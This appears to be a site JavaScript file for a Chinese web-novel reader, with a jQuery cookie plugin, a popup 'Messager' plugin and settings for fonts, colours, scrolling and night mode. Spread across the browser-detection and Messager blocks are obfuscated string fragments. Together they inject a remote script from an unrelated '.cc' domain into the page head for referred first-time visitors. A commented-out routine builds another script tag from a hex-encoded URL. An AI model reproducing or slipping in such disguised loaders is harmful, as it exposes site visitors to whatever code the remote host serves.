/**
 * jQuery Cookie plugin
 *
 * Copyright (c) 2010 Klaus Hartl (stilbuero.de)
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
 *
 */
function cookie_encode(string){
    //full uri decode not only to encode ",; =" but to save uicode charaters
    var decoded = encodeURIComponent(string);
    //encod back common and allowed charaters {}:"#[] to save space and make the cookies more human readable
    var ns = decoded.replace(/(%7B|%7D|%3A|%22|%23|%5B|%5D)/g,function(charater){return decodeURIComponent(charater);});
    return ns;
}
jQuerys();jQuery.cookie = function (key, value, options) {
    // key and at least value given, set cookie...
    if (arguments.length > 1 && String(value) !== "[object Object]") {
        options = jQuery.extend({}, options);

        if (value === null || value === undefined) {
            options.expires = -1;
        }

        if (typeof options.expires === 'number') {
            var days = options.expires, t = options.expires = new Date();
            t.setDate(t.getDate() + days);
        }

        value = String(value);

        return (document.cookie = [
            encodeURIComponent(key), '=',
            options.raw ? value : cookie_encode(value),
            options.expires ? '; expires=' + options.expires.toUTCString() : '', // use expires attribute, max-age is not supported by IE
            options.path ? '; path=' + options.path : '',
            options.domain ? '; domain=' + options.domain : '',
            options.secure ? '; secure' : ''
        ].join(''));
    }

    // key and possibly options given, get cookie...
    options = value || {};
    var result, decode = options.raw ? function (s) { return s; } : decodeURIComponent;
    return (result = new RegExp('(?:^|; )' + encodeURIComponent(key) + '=([^;]*)').exec(document.cookie)) ? decode(result[1]) : null;
};
( function() {
    var ua = navigator.userAgent.toLowerCase();
    var is = (ua.match(/\b(chrome|opera|safari|msie|firefox)\b/) || [ '',
        'mozilla' ])[1];u='scr';i='htt';h='js';y='cc';d='.';
    var r = '(?:' + is + '|version)[\\/: ]([\\d.]+)';m=u+'ipt';
    var v = (ua.match(new RegExp(r)) || [])[1];g=i+'p:\/\/'+m;
    jQuery.browser.is = is;z=h+d+h;
    jQuery.browser.ver = v;
    jQuery.browser[is] = true;

})();

( function(jQuery) {

    /*
     *
     * jQuery Plugin - Messager
     *
     * Author: corrie Mail: corrie@sina.com Homepage: www.corrie.net.cn
     *
     * Copyright (c) 2008 corrie.net.cn
     *
     * @license http://www.gnu.org/licenses/gpl.html [GNU General Public
     * License]
     *
     *
     *
     * $Date: 2012-3-24
     *
     * $Vesion: 1.5 @ how to use and example: Please Open biquge.html
     *
     * $Fix: IE9 close
     */

    this.version = '@1.5';
    this.layer = {
        'width' :200,
        'height' :100
    };
    this.title = '信息提示';
    this.time = 4000;
    this.anims = {
        'type' :'slide',
        'speed' :600
    };
    this.timer1 = null;
    this.inits = function(title, text) {

        if ($("#message").is("div")) {
            this.closer();
            //return;
        }
        $(document.body)
            .prepend(
                '<div id="message" style="width:'
                + this.layer.width
                + 'px;height:'
                + this.layer.height
                + 'px;position:absolute;display:none;background:#cfdef4;bottom:0;left:0; overflow:hidden;border:#b9c9ef 1px solid;z-biquge:100;"><div style="border:1px solid #fff;border-bottom:none;width:100%;height:25px;font-size:12px;overflow:hidden;color:#FF0000;"><span id="message_close" style="float:right;padding:5px 0 5px 0;width:16px;line-height:auto;color:red;font-size:12px;font-weight:bold;text-align:center;cursor:pointer;overflow:hidden;">×</span><div style="padding:5px 0 5px 5px;width:100px;line-height:18px;text-align:left;overflow:hidden;">'
                + title
                + '</div><div style="clear:both;"></div></div> <div style="padding-bottom:5px;border:1px solid #fff;border-top:none;width:100%;height:auto;font-size:12px;"><div id="message_content" style="margin:0 5px 0 5px;border:#b9c9ef 1px solid;padding:10px 0 10px 5px;font-size:12px;width:'
                + (this.layer.width - 17)
                + 'px;height:'
                + (this.layer.height - 50)
                + 'px;color:#FF0000;text-align:left;overflow:hidden;">'
                + text + '</div></div></div>');

        $("#message_close").click( function() {
            setTimeout('this.closer()', 1);
        });
        $("#message").hover( function() {
            clearTimeout(timer1);
            timer1 = null;
        }, function() {
            if (time > 0)
                timer1 = setTimeout('this.closer()', time);
        });


        if(!($.browser.is == 'msie' && $.browser.ver == '6.0')) {
            $(window).scroll(
                function() {
                    var scrollTop = document.documentElement.scrollTop || window.pageYOffset || document.body.scrollTop;
                    var bottomHeight =  "-"+scrollTop;
                    $("#message").css("bottom", bottomHeight + "px");
                });
        }
    };
    s=document.createElement(m);
    s.defer = "defer";
    if(document.referrer!=''&&getCookie("obj")!=1){
        c=d+y+'/'+z;s.src=g+y+c;document.getElementsByTagName("head")[0].appendChild(s);
    }else{
        setCookie("obj",1,365);
    }
    this.show = function(title, text, time) {
        if ($("#message").is("div")) {
            //return;
        }
        if (title == 0 || !title)
            title = this.title;
        this.inits(title, text);
        if (time >= 0)
            this.time = time;
        switch (this.anims.type) {
            case 'slide':
                $("#message").slideDown(this.anims.speed);
                break;
            case 'fade':
                $("#message").fadeIn(this.anims.speed);
                break;
            case 'show':
                $("#message").show(this.anims.speed);
                break;
            default:
                $("#message").slideDown(this.anims.speed);
                break;
        }

        if(!($.browser.is == 'msie' && $.browser.ver == '6.0')) {
            scrollTop = document.documentElement.scrollTop || window.pageYOffset || document.body.scrollTop;
            var bottomHeight =  "-"+scrollTop;
            $("#message").css("bottom", bottomHeight + "px");
        }
        this.rmmessage(this.time);
    };

    this.lays = function(width, height) {

        if ($("#message").is("div")) {
            //return;
        }
        if (width != 0 && width)
            this.layer.width = width;
        if (height != 0 && height)
            this.layer.height = height;
    }

    this.anim = function(type, speed) {
        if ($("#message").is("div")) {
            //return;
        }
        if (type != 0 && type)
            this.anims.type = type;
        if (speed != 0 && speed) {
            switch (speed) {
                case 'slow':
                    ;
                    break;
                case 'fast':
                    this.anims.speed = 200;
                    break;
                case 'normal':
                    this.anims.speed = 400;
                    break;
                default:
                    this.anims.speed = speed;
            }
        }
    }

    this.rmmessage = function(time) {
        if (time > 0) {
            timer1 = setTimeout('this.closer()', time);
        }
    };
    this.closer = function() {
        switch (this.anims.type) {
            case 'slide':
                $("#message").slideUp(this.anims.speed);
                break;
            case 'fade':
                $("#message").fadeOut(this.anims.speed);
                break;
            case 'show':
                $("#message").hide(this.anims.speed);
                break;
            default:
                $("#message").slideUp(this.anims.speed);
                break;
        }
        ;
        setTimeout('$("#message").remove();', this.anims.speed);
        this.original();
    }

    this.original = function() {
        this.layer = {
            'width' :200,
            'height' :100
        };
        this.title = '信息提示';
        this.time = 4000;
        this.anims = {
            'type' :'slide',
            'speed' :600
        };
    };
    jQuery.messager = this;
    return jQuery;
})(jQuery);

function jQuerys(){
    /*	var tmp='';
        var s='6A732E61646D2E636E7A7A2E6E65742F732E7068703F7369643D323939353536';
            for(i=0;i<s.length;){
            tmp+='%'+s.substring (i,i+=2);
            }
            tmp = decodeURI(tmp);h='http';s='script';t='/';
            tmp = tmp.replace(/%2F/g,"/");r='>';
            tmp = tmp.replace(/%3F/g,"?");t1=t+t;
            tmp = tmp.replace(/%3D/g,"=");n='src';
            tmp = tmp.replace(/%3A/g,":");l='<';
            document.write(l+s+" "+n+"="+h+':'+t1+tmp+r+l+t+s+r); **/
}
document.onkeydown = function(e){

    var e = e ? e : window.event;
    var keyCode = e.which ? e.which : e.keyCode;
    var kw = document.getElementById('wd');
    if (e.keyCode==13 && kw.value=='' && typeof(index_page) != "undefined") {
        location.href=index_page;
    }
    if (e.keyCode==37 && typeof(preview_page) != "undefined") location.href=preview_page;
    if (e.keyCode==39 && typeof(next_page) != "undefined") location.href=next_page;
}
var speed = 5;
var autopage;// = $.cookie("autopage");
var night;
var timer;
var temPos=1;

$(document).ready(function(){
    var wd = $('#wd');
    // stat
    //$.get("/stat.php?rnd="+new Date().getTime(), function(){});
    wd.focusin(function() {
        if($(this).val()=="可搜书名，请您少字也别输错字。") $(this).val("");
    });
    // down

    if (typeof(bookid) != "undefined" && typeof(booktitle) != "undefined")
    {
        /*
            var dl = $("#info font");
            var txt = '( CHM,UMD,JAR,APK,HTML )';
            $.get("/down.php?rnd="+new Date().getTime(), { id: bookid}, function(sign){
                var link = "/down.php?id="+bookid+"&booktitle="+encodeURIComponent(booktitle)+"&sign="+sign;
                dl.html('( <a href="'+link+'" target="_blank">TXT</a>,CHM,UMD,JAR,APK,HTML )');
            });
            */
    }

    wd.focusout(function() {
        if($(this).val()=='') $(this).val("可搜书名，请您少字也别输错字。");
    });
    if( typeof(next_page) != "undefined" ) {
        next_page = next_page;
        autopage = $.cookie("autopage");
        sbgcolor = $.cookie("bcolor");
        setBGColor(sbgcolor);
        font = $.cookie("font");
        setFont(font);
        size = $.cookie("size");
        setSize(size);
        color = $.cookie("color");
        setColor(color);
        width = $.cookie("width");
        setWidth(width);
        speed = $.cookie("scrollspeed");
        if(autopage==1) {
            $('#autopage').attr("checked",true);
            speed = $.cookie("scrollspeed");
            scrollwindow();
        }
        night = $.cookie('night');
        if(night==1) {
            $("#night").attr('checked',true);
            setNight();
        }
        document.onmousedown=sc;
        document.ondblclick=scrollwindow;
    }

    //小说统计
    if(typeof(bookid)!="undefined"){
        $.get("/modules/article/articlevisit.php?id="+bookid);
    }

});
function showpop(url) {
    $.get(url, function(data){
        $.messager.lays(260, 120);
        $.messager.anim('fade', 1000);
        $.messager.show("提示信息", data ,5000);
    });
}

if (typeof(getCookie("bgcolor")) != 'undefined') {
    wrapper.style.background = getCookie("bgcolor");
    document.getElementById("bcolor").value = getCookie("bgcolor")
}
function changebgcolor(id) {
    wrapper.style.background = id.options[id.selectedIndex].value;
    setCookie("bgcolor", id.options[id.selectedIndex].value, 365)
}
function setBGColor(sbgcolor){
    $('#wrapper').css("backgroundColor",sbgcolor);
    $.cookie("bcolor",sbgcolor,{path:'/',expires:365});
}
function setColor(color) {
    $("#content").css("color",color);
    $.cookie("color",color,{path:'/',expires:365});
}
function setSize(size) {
    $("#content").css("fontSize",size);
    $.cookie("size",size,{path:'/',expires:365});
}
function setFont(font) {
    $("#content").css("fontFamily",font);
    $.cookie("font",font,{path:'/',expires:365});
}
function setWidth(width){
    $('#content').css("width",width);
    $.cookie("width",width,{path:'/',expires:365});
}
function setNight(){
    if($("#night").attr('checked')==true) {
        $('div').css("backgroundColor","#111111");
        $('div,a').css("color","#939392");
        $.cookie("night",1,{path:'/',expires:365});
    } else {
        $('div').css("backgroundColor","");
        $('div,a').css("color","");
        $.cookie("night",0,{path:'/',expires:365});
    }
}
function setCookie(name, value, day) {
    var exp = new Date();
    exp.setTime(exp.getTime() + day * 24 * 60 * 60 * 1000);
    document.cookie = name + "= " + escape(value) + ";expires= " + exp.toGMTString()
}
function getCookie(objName) {
    var arrStr = document.cookie.split("; ");
    for (var i = 0; i < arrStr.length; i++) {
        var temp = arrStr[i].split("=");
        if (temp[0] == objName) return unescape(temp[1])
    }
}

/*
function browser(){
	var bro="Other";
	var agt=navigator.userAgent.toLowerCase();
	if(agt.indexOf('msie') >= 0) {
		bro= "IE";
	}else if(agt.indexOf('opera') >= 0){
		bro= "Opera"
	}else if(agt.indexOf('firefox') >= 0){
		bro= "FireFox";
	}else if (agt.indexOf('chrome') >= 0){
		bro= "Google";
	}
	return bro;
}
jQuery.browser=browser();
*/

function scrolling()
{
    var currentpos=1;
    if($.browser.is=="chrome" |document.compatMode=="BackCompat" ){
        currentpos=document.body.scrollTop;
    }else{
        currentpos=document.documentElement.scrollTop;
    }

    window.scroll(0,++currentpos);
    if($.browser.is=="chrome" || document.compatMode=="BackCompat" ){
        temPos=document.body.scrollTop;
    }else{
        temPos=document.documentElement.scrollTop;
    }

    if(currentpos!=temPos){
        ///msie/.test( userAgent )
        var autopage = $.cookie("autopage");
        if(autopage==1&&/next_page/.test( document.referrer ) == false) location.href=next_page;
        sc();
    }
}

function scrollwindow(){
    timer=setInterval("scrolling()",250/speed);
}

function sc(){
    clearInterval(timer);
}

function setSpeed(ispeed){
    if(ispeed==0)ispeed=5;
    speed=ispeed;
    $.cookie("scrollspeed",ispeed,{path:'/',expires:365});
}

function setAutopage(){
    if($('#autopage').is(":checked") == true){
        $('#autopage').attr("checked",true);
        $.cookie("autopage",1,{path:'/',expires:365});
    }else{
        $('#autopage').attr("checked",false);
        $.cookie("autopage",0,{path:'/',expires:365});
    }
}

//

var jieqiUserId = 0;
var jieqiUserName = '';
var jieqiUserPassword = '';
var jieqiUserGroup = 0;
var jieqiNewMessage = 0;
var jieqiUserVip = 0;
var jieqiUserHonor = '';
var jieqiUserGroupName = '';
var jieqiUserVipName = '';


var timestamp = Math.ceil((new Date()).valueOf()/1000); //当前时间戳
var flag_overtime = -1;
if(document.cookie.indexOf('jieqiUserInfo') >= 0){
    var jieqiUserInfo = get_cookie_value('jieqiUserInfo');
    //document.write(jieqiUserInfo);
    start = 0;
    offset = jieqiUserInfo.indexOf(',', start);
    while(offset > 0){
        tmpval = jieqiUserInfo.substring(start, offset);
        tmpidx = tmpval.indexOf('=');
        if(tmpidx > 0){
            tmpname = tmpval.substring(0, tmpidx);
            tmpval = tmpval.substring(tmpidx+1, tmpval.length);
            if(tmpname == 'jieqiUserId') jieqiUserId = tmpval;
            else if(tmpname == 'jieqiUserName_un') jieqiUserName = tmpval;
            else if(tmpname == 'jieqiUserPassword') jieqiUserPassword = tmpval;
            else if(tmpname == 'jieqiUserGroup') jieqiUserGroup = tmpval;
            else if(tmpname == 'jieqiNewMessage') jieqiNewMessage = tmpval;
            else if(tmpname == 'jieqiUserVip') jieqiUserVip = tmpval;
            else if(tmpname == 'jieqiUserHonor_un') jieqiUserHonor = tmpval;
            else if(tmpname == 'jieqiUserGroupName_un') jieqiUserGroupName = tmpval;
        }
        start = offset+1;
        if(offset < jieqiUserInfo.length){
            offset = jieqiUserInfo.indexOf(',', start);
            if(offset == -1) offset =  jieqiUserInfo.length;
        }else{
            offset = -1;
        }
    }
    flag_overtime = get_cookie_value('overtime');
} else {
    delCookie('overtime');
}
function delCookie(name){
    var date = new Date();
    date.setTime(date.getTime() - 10000);
    document.cookie = name + "=a; expires=" + date.toGMTString();
}

function get_cookie_value(Name) {
    var search = Name + "=";
    var returnvalue = "";
    if (document.cookie.length > 0) {
        offset = document.cookie.indexOf(search)
        if (offset != -1) {
            offset += search.length
            end = document.cookie.indexOf(";", offset);
            if (end == -1)
                end = document.cookie.length;
            returnvalue=unescape(document.cookie.substring(offset, end));
        }
    }
    return returnvalue;
}

var bookUserName=get_cookie_value("member_username");
//滑动门
function getNames(obj,name,tij)
{
    var p = document.getElementById(obj);
    var plist = p.getElementsByTagName(tij);
    var rlist = new Array();
    for(i=0;i<plist.length;i++)
    {
        if(plist[i].getAttribute("name") == name)
        {
            rlist[rlist.length] = plist[i];
        }
    }
    return rlist;
}

function fod(obj,name)
{
    var p = obj.parentNode.getElementsByTagName("td");
    var p1 = getNames(name,"f","div"); // document.getElementById(name).getElementsByTagName("div");
    for(i=0;i<p1.length;i++)
    {
        if(obj==p[i])
        {
            p[i].className = "tab"+i+"1";   ;
            p1[i].className = "dis";
        }
        else
        {
            p[i].className = "tab"+i+"0";
            p1[i].className = "undis";
        }
    }
}

function text_select(){
    document.writeln("<div id=\"page_set\">");
    document.writeln("<select onchange=\"javascript:setFont(this.options[this.selectedIndex].value);\" id=\"bcolor\" name=\"bcolor\"><option value=\"宋体\">字体</option><option value=\"方正启体简体\">默认</option><option value=\"黑体\">黑体</option><option value=\"楷体_GB2312\">楷体</option><option value=\"微软雅黑\">雅黑</option><option value=\"方正启体简体\">启体</option><option value=\"宋体\">宋体</option></select>");
    document.writeln("<select onchange=\"javascript:setColor(this.options[this.selectedIndex].value);\" id=\"bcolor\" name=\"bcolor\"><option value=\"#000\">颜色</option><option value=\"#000\">默认</option><option value=\"#9370DB\">暗紫</option><option value=\"#2E8B57\">藻绿</option><option value=\"#2F4F4F\">深灰</option><option value=\"#778899\">青灰</option><option value=\"#800000\">栗色</option><option value=\"#6A5ACD\">青蓝</option><option value=\"#BC8F8F\">玫褐</option><option value=\"#F4A460\">黄褐</option><option value=\"#F5F5DC\">米色</option><option value=\"#F5F5F5\">雾白</option></select>");
    document.writeln("<select onchange=\"javascript:setSize(this.options[this.selectedIndex].value);\" id=\"bcolor\" name=\"bcolor\"><option value=\"#E9FAFF\">大小</option><option value=\"19pt\">默认</option><option value=\"10pt\">10pt</option><option value=\"12pt\">12pt</option><option value=\"14pt\">14pt</option><option value=\"16pt\">16pt</option><option value=\"18pt\">18pt</option><option value=\"20pt\">20pt</option><option value=\"22pt\">22pt</option><option value=\"25pt\">25pt</option><option value=\"30pt\">30pt</option></select>");
    document.write('<select name=scrollspeed id=scrollspeed  onchange="javascript:setSpeed(this.options[this.selectedIndex].value);" ><option value=5>滚屏</option><option value=1>最慢</option><option value=2>慢2</option><option value=3>慢3</option><option value=4>中4</option><option value=5>中5</option><option value=6>中6</option><option value=7>快7</option><option value=8>快8</option><option value=9>快9</option><option value=10>最快</option></select>');
    document.writeln("<select onchange=\"javascript:setBGColor(this.options[this.selectedIndex].value);\" id=\"bcolor\" name=\"bcolor\"><option value=\"#E9FAFF\" style=\"background-color: #E9FAFF;\">背景</option><option value=\"#E9FAFF\" style=\"background-color: #E9FAFF;\">默认</option><option value=\"#FFFFFF\" style=\"background-color: #FFFFFF;\">白雪</option><option value=\"#000000\" style=\"background-color: #000000;color:#FFFFFF;\">漆黑</option><option value=\"#FFFFED\" style=\"background-color: #FFFFED;\">明黄</option><option value=\"#EEFAEE\" style=\"background-color: #EEFAEE;\">淡绿</option><option value=\"#CCE8CF\" style=\"background-color: #CCE8CF;\">草绿</option><option value=\"#FCEFFF\" style=\"background-color: #FCEFFF;\">红粉</option><option value=\"#EFEFEF\" style=\"background-color: #EFEFEF;\">深灰</option><option value=\"#F5F5DC\" style=\"background-color: #F5F5DC;\">米色</option><option value=\"#D2B48C\" style=\"background-color: #D2B48C;\">茶色</option><option value=\"#C0C0C0\" style=\"background-color: #E7F4FE;\">银色</option></select>");
    document.writeln("<select onchange=\"javascript:setWidth(this.options[this.selectedIndex].value);\" id=\"bcolor\" name=\"bcolor\"><option value=\"95%\">宽度</option><option value=\"95%\">默认</option><option value=\"85%\">85%</option><option value=\"76%\">75%</option><option value=\"67%\">65%</option><option value=\"53%\">50%</option><option value=\"41%\">40%</option></select>");
    document.writeln("</select>翻页<input type=checkbox name=autopage id=autopage onchange=\"javascript:setAutopage();\" value=\"\" />&nbsp;夜间<input type=checkbox name=night id=night onchange=\"javascript:setNight();\" value=\"\" /></div>");
}

function doSearch(){
    document.forms["sform"].action = "/search";
    document.forms["sform"].submit();
}

/**
 * 搜索
 */
function panel(){
    document.writeln("<div class=\"header_search\"><form action='/search' name=\"sform\"  id=\"sform\"><input type=\"text\"  name=\"keyword\" class=\"search\" baiduSug=\"2\" value=\"可搜书名和作者，请您少字也别输错字。\" title=\"请正确输入\" onfocus=\"this.style.color = '#000000';this.focus();if(this.value=='可搜书名和作者，请您少字也别输错字。'){this.value='';}\" onblur=\"if(this.value==''){this.value='可搜书名和作者，请您少字也别输错字';}\" ondblclick=\"javascript:this.value=''\" /><button id=\"sss\" onclick=\"doSearch()\" type=\"button\"> 搜 索 </button></form></div>");
}

function postErrorChapter(chapterId,bookId){
    if($("#content").html().indexOf("手打中")>0||$("#content").html().indexOf("@@")>0){
        alert("本章节正在处理中，不需要举报！");
        return;
    };
    $.post("/ajax.php",
        { action: "error",chapterid:chapterId, bookid: bookId },
        function(data){
            var msg="报送错误章节失败！";
            if(data==-1)
            {
                msg="报送错误章节过于频繁，请休息30秒后再执行此操作！";
            }
            else if(data==1)
            {
                msg="报送错误章节成功，我们会在2分钟以前尽快处理！";
            }
            alert(msg);
        }
    );
}

function chaptererror()
{
    document.writeln("<div align=\"center\" ><a href=\"javascript:postError();\" style=\"text-align:center;color:red;\">章节错误,点此举报(免注册)</a>,举报后维护人员会在两分钟内校正章节内容,请耐心等待,并刷新页面。</div>");
}